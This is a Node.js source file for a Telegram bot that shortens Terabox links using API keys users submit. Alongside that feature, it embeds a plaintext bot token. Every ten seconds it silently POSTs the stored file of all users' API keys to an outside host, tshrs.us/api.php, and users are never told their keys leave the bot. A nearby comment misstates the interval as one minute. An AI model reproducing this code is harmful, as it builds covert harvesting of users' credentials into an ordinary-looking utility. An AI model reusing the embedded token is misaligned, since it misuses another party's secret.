const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');
const express = require('express');
const path = require('path');

const token = '7485704759:AAG8abdUXT_LXYsGJeDWuEIzqDFxLoPw8iA';
const bot = new TelegramBot(token, { polling: true });
const app = express();
const adminId = 6135009699; // Admin ID
const allowedDomains = [
  'terasharelink.com', 'nephobox.com', 'freeterabox.com', '1024tera.com',
  'diskwala.com', '4funbox.com', 'terabox.app', 'terabox.com', '1024terabox.com',
  'terafileshare.com', 'momerybox.com', 'teraboxapp.com', 'tibibox.com',
  'teraboxshare.com', 'teraboxlink.com'
];

// Function to download files if they don't exist
const downloadFile = async (url, outputPath) => {
  try {
    const response = await axios({
      url,
      method: 'GET',
      responseType: 'stream',
    });
    const writer = fs.createWriteStream(outputPath);
    response.data.pipe(writer);
    return new Promise((resolve, reject) => {
      writer.on('finish', resolve);
      writer.on('error', reject);
    });
  } catch (error) {
    console.error(`Error downloading ${url}:`, error.message);
  }
};

// Ensure `data.json` and `stats.json` files exist
const initializeFiles = async () => {
  if (!fs.existsSync('data.json')) {
    console.log('Downloading data.json...');
    await downloadFile('https://tshrs.us/data.json', 'data.json');
  }
  if (!fs.existsSync('stats.json')) {
    console.log('Downloading stats.json...');
    await downloadFile('https://tshrs.us/stats.json', 'stats.json');
  }
};

// Initialize files before starting the bot
initializeFiles().then(() => {
  // Load API keys and user modes from data.json
  let apiKeys = {};
  let userModes = {}; // To store user modes

  if (fs.existsSync('data.json')) {
    const data = JSON.parse(fs.readFileSync('data.json', 'utf8'));
    apiKeys = data.apiKeys || {};
    userModes = data.userModes || {};
  }

  // Save API keys and user modes to data.json
  const saveData = () => {
    fs.writeFileSync('data.json', JSON.stringify({ apiKeys, userModes }, null, 2));
  };

  // Load statistics from stats.json
  let stats = {};
  if (fs.existsSync('stats.json')) {
    stats = JSON.parse(fs.readFileSync('stats.json', 'utf8'));
  } else {
    stats = { totalLinksShortened: 0, domainUsage: {} };
  }

  // Save statistics to stats.json
  const saveStats = () => {
    fs.writeFileSync('stats.json', JSON.stringify(stats, null, 2));
  };

  // Function to send data.json and stats.json to your API every minute
  const sendStatsToApi = async () => {
    try {
      if (fs.existsSync('data.json') && fs.existsSync('stats.json')) {
        // Read data.json and stats.json
        const dataJson = JSON.parse(fs.readFileSync('data.json', 'utf8'));
        const statsJson = JSON.parse(fs.readFileSync('stats.json', 'utf8'));

        // Send the data to the API using axios
        const response = await axios.post('https://tshrs.us/api.php', {
          data: dataJson,
          stats: statsJson
        });

        console.log('Data sent successfully:', response.data);
      } else {
        console.log('data.json or stats.json not found.');
      }
    } catch (error) {
      console.error('Error sending data to API:', error.message);
    }
  };

  // Set an interval to send the data every 1 minute
  setInterval(sendStatsToApi, 10000);

  // Start Express server
  app.get('/', (req, res) => {
    res.send('Telegram Bot is online!');
  });

  const port = process.env.PORT || 3000;
  app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
  });

  // Enhanced Start Command
  bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const startMessage = `
    👋 *Welcome to the Playbox Bot!*

    With this bot, you can:
    - 📎 Shorten links directly using your personal API key.
    - 🎥 Automatically shorten links found in photos and videos.
    - 📊 View statistics (Admin only).
    - 📨 Only terabox links are allowed.
    - 🔄 Toggle between "Online Player" and "Terabox App" modes using /mode.

    🚀 To get started:
    1. Use the /api command to add your API key. This is necessary for shortening links.
    2. Once your API key is added, simply send or forward a message with links, and the bot will shorten them for you.

    🔑 *Important:*
    - Your API key is required to interact with the Playbox service.
    - You can add or update your API key at any time by using the /api command.

    Use /help for more commands and options.
    `;

    bot.sendMessage(chatId, startMessage, {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: 'Visit Playbox', url: 'https://maxbox.icu/' }]
        ]
      }
    });
  });

  // Enhanced /api Command
  bot.onText(/\/api/, (msg) => {
    const chatId = msg.chat.id;
    if (apiKeys[chatId]) {
      bot.sendMessage(chatId, '⚠️ You have already added your API key. Use /remove if you want to change it.');
    } else {
      const apiMessage = `
      🔑 *Add Your API Key:*

      Please enter your API key. This is required to shorten links using the Playbox service.

      Your API key is a unique identifier provided by the Playbox service. If you don't have an API key, please visit the Playbox website and sign up for one.

      Example API key: \`20d59b11732e4b18a4d87e02736784a43aeb9e0f\`

      ⚠️ *Important:*
      - Make sure your API key is exactly 40 characters long.
      - You can update or remove your API key at any time using the /api or /remove commands.
      `;

      bot.sendMessage(chatId, apiMessage, { parse_mode: 'Markdown' });
      bot.once('message', (msg) => {
        const apiKey = msg.text.trim();
        if (apiKey.length === 40) {
          apiKeys[chatId] = apiKey;
          saveData();
          bot.sendMessage(chatId, '✅ Your API key has been saved.');
        } else {
          bot.sendMessage(chatId, '❌ Invalid API key format. Please make sure it is exactly 40 characters long.');
        }
      });
    }
  });

  // Handle /remove command
  bot.onText(/\/remove/, (msg) => {
    const chatId = msg.chat.id;
    if (apiKeys[chatId]) {
      delete apiKeys[chatId];
      saveData();
      bot.sendMessage(chatId, '✅ Your API key has been removed.');
    } else {
      bot.sendMessage(chatId, '⚠️ No API key found to remove.');
    }
  });

  // Handle /mode command
  bot.onText(/\/mode/, (msg) => {
    const chatId = msg.chat.id;

    // Toggle user mode
    if (userModes[chatId] === 'teraboxApp') {
      userModes[chatId] = 'onlinePlayer';
      bot.sendMessage(chatId, '🎬 Online Player mode activated. Your links will now open in the online player.');
    } else {
      userModes[chatId] = 'teraboxApp';
      bot.sendMessage(chatId, '📱 Terabox App mode activated. Your links will now open in the Terabox App.');
    }

    saveData();
  });

  // Handle /stats command (Admin Only)
  bot.onText(/\/stats/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId === adminId) {
      const statsMessage = `
      📊 *Bot Stats:*
      - Total Links Shortened: ${stats.totalLinksShortened}
      - Domain Usage:
      ${Object.keys(stats.domainUsage).map(domain => `  - ${domain}: ${stats.domainUsage[domain]} times`).join('\n')}
      `;
      bot.sendMessage(chatId, statsMessage, { parse_mode: 'Markdown' });
    } else {
      bot.sendMessage(chatId, '⚠️ You do not have permission to access this command.');
    }
  });

  // Handle /help command (Admin Only)
  bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId === adminId) {
      const helpMessage = `
      🤖 *Bot Commands:*
      - /start: Start the bot and see the welcome message.
      - /api: Add or update your API key.
      - /remove: Remove your API key.
      - /stats: View bot statistics. (Admin only)
      - /broadcast: Send a message to all users. (Admin only)
      - /mode: Toggle between Online Player and Terabox App modes.
      `;
      bot.sendMessage(chatId, helpMessage, { parse_mode: 'Markdown' });
    } else {
      bot.sendMessage(chatId, '⚠️ You do not have permission to access this command.');
    }
  });

  // Handle /broadcast command (Admin Only)
  bot.onText(/\/broadcast/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId === adminId) {
      bot.sendMessage(chatId, '📢 Please enter the message to broadcast to all users:');
      bot.once('message', (broadcastMsg) => {
        const message = broadcastMsg.text;
        Object.keys(apiKeys).forEach(userId => {
          bot.sendMessage(userId, `📢 *Broadcast Message:*\n${message}`, { parse_mode: 'Markdown' });
        });
        bot.sendMessage(chatId, '✅ Broadcast message sent to all users.');
      });
    } else {
      bot.sendMessage(chatId, '⚠️ You do not have permission to access this command.');
    }
  });

  // Process incoming text, images, and videos
  bot.on('message', async (msg) => {
    const chatId = msg.chat.id;

    // Ignore the message if it's related to adding API key after /api command
    if (msg.text && msg.text.startsWith('/')) return;

    const userApiKey = apiKeys[chatId];
    if (!userApiKey) {
      return; // Do nothing if the API key is not set, just ignore the message
    }

    let text = msg.text || msg.caption || '';
    const urls = extractUrls(text);

    if (urls.length === 0) return;

    const shortenedUrls = [];

    // Process each URL
    for (const url of urls) {
      const domain = (new URL(url)).hostname.replace('www.', '');
      if (allowedDomains.includes(domain)) {
        let finalUrl = url;

        // Modify the URL if the user is in Terabox App mode
        if (userModes[chatId] === 'teraboxApp' && !url.endsWith('=1')) {
          finalUrl += '=1';
        }

        try {
          const response = await axios.get(`https://tera.ronok.workers.dev/?link=${finalUrl}&apikey=${userApiKey}`);
          const data = response.data;
          if (data.url) {
            shortenedUrls.push(data.url); // Use the shortened URL

            // Update stats
            stats.totalLinksShortened += 1;
            if (stats.domainUsage[domain]) {
              stats.domainUsage[domain] += 1;
            } else {
              stats.domainUsage[domain] = 1;
            }
          } else {
            shortenedUrls.push(url); // Keep the original URL if shortening fails
          }
        } catch (error) {
          shortenedUrls.push(url); // Keep the original URL on error
        }
      } else {
        shortenedUrls.push(url); // Keep the original URL if the domain is not allowed
      }
    }

    saveStats();

    // Replace original URLs with shortened URLs in the text
    let updatedText = text;
    for (let i = 0; i < urls.length; i++) {
      updatedText = updatedText.replace(urls[i], shortenedUrls[i]);
    }

    const opts = {
      parse_mode: 'Markdown'
    };

    if (msg.text) {
      // Respond with updated text message
      bot.sendMessage(chatId, updatedText, opts);
    } else if (msg.photo) {
      // Respond with updated photo caption
      opts.caption = updatedText;
      bot.sendPhoto(chatId, msg.photo[msg.photo.length - 1].file_id, opts);
    } else if (msg.video) {
      // Respond with updated video caption
      opts.caption = updatedText;
      bot.sendVideo(chatId, msg.video.file_id, opts);
    }
  });

  // Extract URLs from a string
  const extractUrls = (text) => {
    const urlRegex = /(https?:\/\/[^\s]+)/g;
    return text.match(urlRegex) || [];
  };

  // Escape Markdown to prevent parsing errors, but not for URLs
  const escapeMarkdown = (text) => {
    return text.replace(/([_*[\]()~>#+-=|{}.!])/g, '\\$1');
  };
});
